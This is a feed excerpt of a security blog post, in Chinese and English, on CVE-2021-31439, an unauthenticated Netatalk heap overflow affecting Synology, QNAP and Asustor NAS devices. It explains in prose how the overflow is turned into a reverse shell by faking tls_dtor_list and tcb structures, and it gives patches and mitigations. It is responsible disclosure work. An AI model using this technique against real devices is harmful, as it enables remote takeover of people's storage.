&lt;p&gt;åœ¨è§£æ±º stack guard å•é¡Œå¾Œï¼Œnetatalk å·²å¯æ­£å¸¸é‹ä½œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘éœ€è¦æ§‹é€  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; çµæ§‹ä¸¦çµæŸç¨‹å¼ä¾†æ§åˆ¶ RIPï¼Œåœ¨ç•¶æ™‚çš„ synology çš„ afpd ä¸­ä¸¦æ²’æœ‰é–‹å•Ÿ PIEï¼Œæˆ‘å€‘å¯ä»¥åœ¨ afpd çš„ data æ®µä¸­ï¼Œæ§‹é€  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å‰›å¥½åœ¨ä½¿ç”¨ dhx2 method çš„ login åŠŸèƒ½ä¸­ï¼Œæœƒå°‡æˆ‘å€‘è¦ç™»å…¥çš„ username è¤‡è£½åˆ° global çš„ buffer ä¸­ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å°‡é€™çµæ§‹è·Ÿè‘— username ä¸€èµ·å¯«å…¥å›ºå®šçš„å·²çŸ¥ä½ç½®ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä¸€åˆ‡éƒ½æ§‹é€ å®Œæˆå¾Œï¼Œæˆ‘å€‘é€™é‚Šå¯ä»¥è§¸ç™¼æ­£å¸¸åŠŸèƒ½çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSICloseSession&lt;/code&gt; å³å¯è§¸ç™¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit()&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;tls_dtor_list-in-synology&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in Synology&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ reverse å¾Œï¼Œç™¼ç¾ synology çš„ glibc ä¸­ï¼Œæœƒä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_get_addr()&lt;/code&gt; ä¾†å–å¾— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;ï¼Œä¸¦éç›´æ¥å­˜å– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; é€™å€‹å…¨åŸŸè®Šæ•¸ï¼Œè€Œé€™å‡½å¼çš„å–å¾—æ–¹å¼å‰‡æœƒå¾å‰è¿° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; ä¸­å…ˆå– div æ¬„ä½å¾Œï¼Œå†å–å¾—å…¶ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ï¼Œå› æ­¤æˆ‘å€‘éœ€è¦é€£åŒ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcb-&amp;gt;div&lt;/code&gt; ä¸€èµ·æ§‹é€ åœ¨å›ºå®šä½ç½®ï¼Œå¦å¤–ä¸€é»æ˜¯ Synology çš„ afpd ä¸­ä¸¦æ²’æœ‰ system å¯ç”¨ï¼Œä½†äº‹å¯¦ä¸Šæœ‰ execl å¯ä»¥ä½¿ç”¨ï¼Œåªæ˜¯åƒæ•¸ç¨å¾®è¤‡é›œä¸€é»è€Œå·²ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘æ§‹é€ çš„çµæ§‹å¦‚ä¸Šåœ–æ‰€ç¤ºï¼Œæˆ‘å€‘å°‡ tcb åŠ dtor_list çµæ§‹éƒ½æ§‹é€ åœ¨ username buffer ä¸­ï¼Œè§¸ç™¼ exit() å¾Œï¼Œå°±æœƒå»åŸ·è¡Œ execl ä¸¦å–å¾—åé€£ shellã€‚&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/ocZkWuSCr4Y&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;h3 id=&quot;remark&quot;&gt;Remark&lt;/h3&gt;

&lt;p&gt;åœ¨ä¸€èˆ¬çš„ Netatalk ä¸­ï¼Œæ˜¯æœƒå•Ÿç”¨ PIE ï¼Œä¸å¤ªå®¹æ˜“åœ¨å·²çŸ¥ä½ç½®æ§‹é€  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt;ï¼Œå¯¦éš›ä¸Šä¹Ÿå¯ä»¥ç”¨é¡ä¼¼æ–¹æ³• leak å‡º libc ä½ç½®ï¼Œä¾èˆŠæ˜¯ exploitableï¼Œè©²æ¼æ´ä¸åªå½±éŸ¿ Synology ä¹Ÿæœƒå½±éŸ¿åˆ°å¤§éƒ¨åˆ†æœ‰ä½¿ç”¨ Netatalk çš„è¨­å‚™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;other-vendor&quot;&gt;Other vendor&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘æ¸¬è©¦äº†è¨±å¤šå®¶æœ‰ä½¿ç”¨åˆ° Netatalk çš„å» å•†ï¼Œç™¼ç¾ä¸å°‘å®¶æœ‰å­˜åœ¨é¡ä¼¼çš„å•é¡Œï¼Œéƒ¨åˆ†æ˜¯ unexploitable ä½†ä¹Ÿæœ‰éƒ¨åˆ†æ˜¯ exploitableã€‚æˆ‘å€‘é€™é‚Šå¯¦æ¸¬äº† QNAP åŠ Asustorï¼Œçš†æœ‰æˆåŠŸç²å¾— shellã€‚&lt;/p&gt;

&lt;h4 id=&quot;qnap&quot;&gt;QNAP&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on TS451
    &lt;ul&gt;
      &lt;li&gt;QTS 4.5.4.1741&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…§å»º system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20220328/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;asustor&quot;&gt;Asustor&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on AS5202T
    &lt;ul&gt;
      &lt;li&gt;ADM 3.5.7.RJR1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…§å»º system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;QNAP åŠ Asustor å…©å®¶ NAS éƒ½æ²’æœ‰é–‹å•Ÿ Stack guardï¼Œä¸éœ€ brute-force å³å¯ç²å¾—åé€£ shellã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹æ¼æ´åœ¨ Synology å°šæœªä¿®è£œæ™‚ï¼Œåªè¦ default è£å¥½å°±å¯ä»¥åˆ©ç”¨ï¼Œ&lt;strong&gt;ä¸éœ€ä»»ä½•èªè­‰&lt;/strong&gt;ï¼Œè€Œ QNAP åŠ Asustor é›–ç„¶ä¸æ˜¯é è¨­é–‹å•Ÿï¼Œä½†ä¸å°‘æœ‰ä½¿ç”¨ Mac çš„ç”¨æˆ¶ï¼Œé‚„æ˜¯æœƒç‚ºäº†æ–¹ä¾¿æŠŠå®ƒæ‰“é–‹ï¼ŒåŸºæœ¬ä¸Šåªè¦æ˜¯ NAS å¹¾ä¹éƒ½æœƒç”¨åˆ° Netatalkï¼Œçµ•å¤§å¤šæ•¸çš„ NAS éƒ½æœ‰å½±éŸ¿ï¼Œåªè¦æœ‰é–‹å•Ÿ Netatalkï¼Œæ”»æ“Šè€…å¯ä»¥åˆ©ç”¨é€™å€‹æ¼æ´æ‰“ä¸‹å¤§éƒ¨åˆ†çš„ NASã€‚&lt;strong&gt;ä½ çš„ NAS å°±å†ä¹Ÿä¸æœƒæ˜¯ä½ çš„ NASã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¾Œä¾†ä¹Ÿå¾ shodan ä¸Šç™¼ç¾ï¼Œå…¶å¯¦ä¹Ÿæœ‰éå¸¸å¤šäººå°‡ netatalk é–‹åœ¨å¤–ç¶²ï¼Œå…‰åœ¨ shodan ä¸Šå°±æœ‰ 13 è¬å°æ©Ÿå™¨ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ˜¯ Synologyã€‚&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;ç›®å‰ä¸Šè¿°ä¸‰å°çš†å·²ä¿®è£œï¼Œè«‹å°šæœªæ›´æ–°çš„ç”¨æˆ¶æ›´æ–°åˆ°æœ€æ–°&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Synology
    &lt;ul&gt;
      &lt;li&gt;https://www.synology.com/zh-hk/security/advisory/Synology_SA_20_26&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;QNAP
    &lt;ul&gt;
      &lt;li&gt;https://www.qnap.com/en/security-advisory/qsa-21-50&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Asustor
    &lt;ul&gt;
      &lt;li&gt;https://www.asustor.com/service/release_notes#ADM%203.5.7.RKU2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è©²æ¼æ´ä¹Ÿåœ¨è¿‘æœŸé‡‹å‡ºçš„ &lt;a href=&quot;https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html&quot;&gt;Netatalk 3.1.13&lt;/a&gt; ç‰ˆæœ¬ä¸­ä¿®å¾©ï¼Œå¦‚æœ‰ä½¿ç”¨åˆ° Netatalk 3.1.13 ä»¥å‰ç‰ˆæœ¬ï¼Œä¹Ÿè«‹å‹™å¿…æ›´æ–°ã€‚&lt;/p&gt;

&lt;h3 id=&quot;disable-afp&quot;&gt;Disable AFP&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ²’ä½¿ç”¨ AFP æ™‚ï¼Œæœ€å¥½ç›´æ¥é—œæ‰æˆ–åªé™åˆ¶åœ¨å…§ç¶²å­˜å–ã€‚è©² project å¹¾ä¹å·²ç¶“å¾ˆå°‘ç¶­è­·ï¼Œç¹¼çºŒä½¿ç”¨é¢¨éšªæ¥µé«˜ã€‚&lt;/li&gt;
  &lt;li&gt;æ”¹ç”¨ SMB &lt;strong&gt;ç›¸å°å®‰å…¨&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;å¦‚æœæƒ³è¦ç”¨é¡ä¼¼åŠŸèƒ½ï¼Œå»ºè­°å¯ä½¿ç”¨ SMB ç›¸å°å®‰å…¨ä¸å°‘ï¼Œä½†åªèƒ½èªªç›¸å°å®‰å…¨ï¼Œä¸èƒ½èªªçµ•å°æ²’å•é¡Œï¼Œå»ºè­°é‚„æ˜¯å°‡ç›¸é—œæœå‹™éƒ½é–‹åœ¨å…§ç¶²å°±å¥½ï¼Œæ²’ç”¨åˆ°çš„èƒ½é—œå°±é—œ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;æˆ‘å€‘å·²æˆåŠŸåœ¨ NAS ä¸­æ‰¾åˆ°ä¸€å€‹åš´é‡æ¼æ´ï¼Œä¸¦ä¸”æˆåŠŸå¯«å‡ºæ¦‚å¿µè­‰æ˜ç¨‹å¼ï¼Œè­‰å¯¦å¯ä»¥åˆ©ç”¨åœ¨ Synologyã€QNAP åŠ Asustor ç­‰ä¸»æµ NAS ä¸Šåˆ©ç”¨ã€‚æˆ‘å€‘ä¹Ÿèªç‚º Netatalk æ˜¯åœ¨ NAS ä¸­æ–°ä¸€ä»£çš„å¾Œé–€!&lt;/p&gt;

&lt;p&gt;æœªä¾†å¸Œæœ›æœ‰ä½¿ç”¨åˆ°ç¬¬ä¸‰æ–¹å¥—ä»¶çš„ NAS å» å•†ï¼Œå¯ä»¥å¤šé‡æ–°å¯©è¦–ä¸€ä¸‹ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€å¸¶ä¾†çš„å®‰å…¨æ€§å•é¡Œï¼Œå¼·çƒˆå»ºè­°å¯ä»¥è‡ªè¡Œ Review ä¸€æ¬¡ï¼Œä¸¦ä¸”æ³¨æ„å…¶ä»–å» å•†æ˜¯å¦ä¹Ÿæœ‰ä¿®å¾©åŒæ¨£å¥—ä»¶ä¸Šçš„æ¼æ´ï¼Œå¾ˆæœ‰å¯èƒ½è‡ªå·±ä¹Ÿæœƒå—åˆ°å½±éŸ¿ï¼Œä¹Ÿå¸Œæœ›ä½¿ç”¨ NAS çš„ç”¨æˆ¶ï¼Œä¹Ÿèƒ½å¤šå¤šé‡è¦–ä¸è¦æŠŠ NAS é–‹åœ¨å¤–ç¶²ï¼Œèƒ½é—œçš„æœå‹™å°±ç›¡å¯èƒ½é—œé–‰ï¼Œä»¥æ¸›å°‘æ”»æ“Šé¢ï¼Œè®“æ”»æ“Šè€…æœ‰æ©Ÿå¯è¶ã€‚&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;äº‹å¯¦ä¸Šï¼Œæˆ‘å€‘ä¸¦ä¸åªæœ‰æ‰¾åˆ°ä¸€å€‹æ¼æ´ï¼Œæˆ‘å€‘ä¹Ÿç™¼ç¾é‚„æœ‰ä¸å°‘å•é¡Œï¼Œä¹Ÿé‹ç”¨åœ¨å»å¹´çš„ Pwn2Own Austin ä¸Šï¼Œé€™éƒ¨åˆ†æˆ‘å€‘åœ¨å¤§éƒ¨åˆ†å» å•†ä¿®å¾©å¾Œæœƒåœ¨å…¬é–‹å…¶ä»–çš„ç ”ç©¶ï¼Œå°±æ•¬è«‹æœŸå¾… Part IIã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS/</link>
                <guid>https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS</guid>
                <pubDate>Mon, 28 Mar 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your NAS is not your NAS !</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Two years ago, we found a &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-492/&quot;&gt;critical vulnerability&lt;/a&gt;, CVE-2021-31439, on Synology NAS. This vulnerability can let an unauthorized attacker gain code execution on remote Synology DiskStation NAS server. We used this vulnerability to exploit Synology DS418play NAS in Pwn2Own Tokyo 2020. After that, we found the vulnerability is not only exists on Synology but also on most NAS vendors. Following we will describe the details and how we exploit it.&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;https://hitcon.org/2021/en&quot;&gt;HITCON 2021&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2021/agenda/03f06675-261d-4c97-b524-33ef9cc6ccb2/%E4%BD%A0%E7%9A%84%20NAS%20%E4%B8%8D%E6%98%AF%E4%BD%A0%E7%9A%84%20NAS%20!.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;network-attached-storage&quot;&gt;Network Attached Storage&lt;/h2&gt;

&lt;p&gt;In the early days, NAS was generally used to separate the server and data and also used for backup. It was mainly used to allow users to directly access data and share files on the Internet. In modern times, NAS provides not only file sharing but also various services. In this era of Internet of Things, there will be more people combining NAS and home assistants to make life more convenient.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;why-do-we-want-to-research-nas&quot;&gt;Why do we want to research NAS?&lt;/h3&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;
&lt;p&gt;While we were doing red team assessment, we found that NAS generally appeared in the corporate intranet, or sometimes even exposed to the external network. They usually stored a lot of corporate confidential information on the NAS. Therefore, NAS gradually attracted our attention, and its Strategic Value has been much higher than before.&lt;/p&gt;

&lt;h4 id=&quot;ransomware&quot;&gt;Ransomware&lt;/h4&gt;
&lt;p&gt;NAS has become more and more popular in recent years. More and more people store important data on NAS. It makes NAS a target of ransomware. At the beginning of last year, NAS vulnerabilities led to outbreak of locker event. We hope to reduce the recurrence of similar things, thereby increasing the priority of NAS research to improve NAS security.&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-mobile-2020&quot;&gt;Pwn2Own Mobile 2020&lt;/h4&gt;
&lt;p&gt;The last reason is that NAS has become one of the main targets of Pwn2Own Mobile since 2020. We also wanted to try to join Pwn2Pwn event, so we decided to make NAS as the primary goal of the research at that time. Because of Synology is the most popular device in Taiwan, we decided start from it.&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;DS918+&lt;/li&gt;
  &lt;li&gt;DSM 6.2.3-25426&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our test environment is Synology DS918+. It very similar as DS418 play(target of Pwn2Own Tokyo 2020). In order to better meet the environment that we usually encounter and the requirements in Pwn2Own, it will be in the state of all default settings.&lt;/p&gt;

&lt;h3 id=&quot;attack-surface&quot;&gt;Attack surface&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First of all, we can use netstat to find which port is open. We can see that in the default environment, many services are opened, such as smb/nginx/afpd.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In UDP, it has minissdpd/findhost/snmpd, etc., most of protocols help to find devices.&lt;/p&gt;

&lt;p&gt;We selected a few services for preliminary analysis.&lt;/p&gt;

&lt;h4 id=&quot;dsm-web-interface&quot;&gt;DSM Web interface&lt;/h4&gt;
&lt;p&gt;The first one is the DSM Web interface. This part is probably the one that most people analyze and it has obvious entry points. Many years ago, there were many command injection vulnerabilities, but after that Synology set strict specifications. There are almost no similar problems nowadays.&lt;/p&gt;

&lt;h4 id=&quot;smb&quot;&gt;SMB&lt;/h4&gt;
&lt;p&gt;The SMB protocol in Synology is based on &lt;a href=&quot;https://www.samba.org/&quot;&gt;Samba&lt;/a&gt;. Due to the large number of user, many researcher are doing code review on it. Therefore, there are many vulnerabilities found in Samba every year. The most famous vulnerability recently is &lt;a href=&quot;https://www.samba.org/samba/security/CVE-2017-7494.html&quot;&gt;SambaCry&lt;/a&gt;. But because more people are reviewing, it is relatively safer than other services.&lt;/p&gt;

&lt;h4 id=&quot;iscsi-manager&quot;&gt;iSCSI Manager&lt;/h4&gt;
&lt;p&gt;It mainly helps users manage and monitor iSCSI services and it is developed by Synology itself. There are a lot of vulnerabilities in iSCSI recently. Maybe it will be a good target. If there is no other attack surface, we might analyze it first.&lt;/p&gt;

&lt;h4 id=&quot;netatalk&quot;&gt;Netatalk&lt;/h4&gt;
&lt;p&gt;The last one is Netatalk, which is known as afp protocol. Netatalk in Synology is based on &lt;a href=&quot;http://netatalk.sourceforge.net/&quot;&gt;Netatak&lt;/a&gt; 3.1.8. The most critical vulnerability recently is CVE-2018-1160. For this vulnerability, please refer to &lt;a href=&quot;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&quot;&gt;Exploiting an 18 Year Old Bug&lt;/a&gt;. Compared with other services, Netatalk has very few vulnerabilities in the past. It is less noticed, and it has not been updated and maintained for a long time.&lt;/p&gt;

&lt;p&gt;After overall analysis, we believe that Netatalk is the most vulnerable point in Synology. We finally decided to analyze it first. In fact, there are other services and attack surfaces, but we didnâ€™t spend much time on other service. We will only focus on Netatalk in this article.&lt;/p&gt;

&lt;h2 id=&quot;netatalk-1&quot;&gt;Netatalk&lt;/h2&gt;
&lt;p&gt;Apple Filing Protocol (AFP) is a file transfer protocol similar to SMB. It is used to transfer and share files on MAC. Because Apple itself is not open-sourced, in order to utilize AFP on Unix-like systems, Netatalk is created. Netatalk is a freely-available Open Source AFP fileserver. Almost every NAS uses it to make file sharing on MAC more convenient.&lt;/p&gt;

&lt;h3 id=&quot;netatalk-in-synology&quot;&gt;Netatalk in Synology&lt;/h3&gt;

&lt;p&gt;The netatalk in Synology is enabled by default. The version is modified from netatalk 3.1.8, and it tracks security updates regularly. Once installed, you can use the AFP protocol to share files with Synology NAS. It also enables protections such as ASLR, NX and StackGuard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dsi&quot;&gt;DSI&lt;/h4&gt;
&lt;p&gt;Before we look into the detail of the vulnerability we need to talk about Data Stream Interface (DSI). The DSI is a session layer format used to carry AFP traffic over TCP. While server and client communicate through the AFP, a DSI header is in front of each packet.&lt;/p&gt;

&lt;p&gt;DSI Packet Header :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The content of the DSI packet is shown as the figure above. It contains metadata and payload, which generally follows the DSI header and payload format.&lt;/p&gt;

&lt;p&gt;AFP over DSI :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The communication of the AFP protocol is shown above. The client first gets the server information to determine available authentication methods, the version used, and so on. Then it opens a new session and to execute AFP commands. Without authentication, we can only do related operations such as login and logout. Once the client is verified, we can do file operations like SMB.&lt;/p&gt;

&lt;p&gt;In Netatalk implementation, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_block&lt;/code&gt; will be used as the packet structure.&lt;/p&gt;

&lt;p&gt;dsi_block :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dsi_flag means that the packet is a request or reply&lt;/li&gt;
  &lt;li&gt;dsi_command indicates what our request does
    &lt;ul&gt;
      &lt;li&gt;DSICloseSession&lt;/li&gt;
      &lt;li&gt;DSICommand&lt;/li&gt;
      &lt;li&gt;DSIGetStatus&lt;/li&gt;
      &lt;li&gt;DSIOpenSession&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_code
    &lt;ul&gt;
      &lt;li&gt;Error code&lt;/li&gt;
      &lt;li&gt;For reply&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_doff
    &lt;ul&gt;
      &lt;li&gt;DSI data offset&lt;/li&gt;
      &lt;li&gt;Using in DSIWrite&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_len
    &lt;ul&gt;
      &lt;li&gt;The Length of Payload&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DSI : A descriptor of dsi stream&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Netatalk, most of the information are stored in a structure called DSI for subsequent operations after parsing the packet and configuration files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_quantum&lt;/code&gt; and payload content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The payload of the packet is stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command&lt;/code&gt; buffer in the DSI structure. The buffer size is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_quantum&lt;/code&gt;, and the value is specified in the afp configuration file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;afp.conf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If not specified, it uses the default size(0x100000).&lt;/p&gt;

&lt;p&gt;With a preliminary understanding, letâ€™s talk about this vulnerability.&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability we found occurs while receiving the payload. It can be triggered without authentication. The vulnerable function is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Itâ€™s the function that parses the information from received packet and puts it into the DSI structure. When it receives the packet data, it first determine how much data to read into the command buffer according to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_len&lt;/code&gt; in the dsi header. At the beginning, the size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_cmdlen&lt;/code&gt; is verified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, as shown in the picture above, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; is provided by user, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; is used as the length. There is no verification here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The default length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; is 0x100000(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;server_quantum&lt;/code&gt;), which is a fixed length allocated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_init&lt;/code&gt;, so as long as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;header.dsi_doff&lt;/code&gt; is larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;server_quantum&lt;/code&gt;, heap overflow occurs.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;In DSM 6.2.3, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; buffer is allocated by malloc at libc 2.20. When it allocates more than 0x20000, malloc calls mmap to allocate memory. The memory layout of afpd after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_init&lt;/code&gt; is as below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the below of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi-&amp;gt;commands&lt;/code&gt; is Thread Local Storage, which is used to store thread local variables of the main thread.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

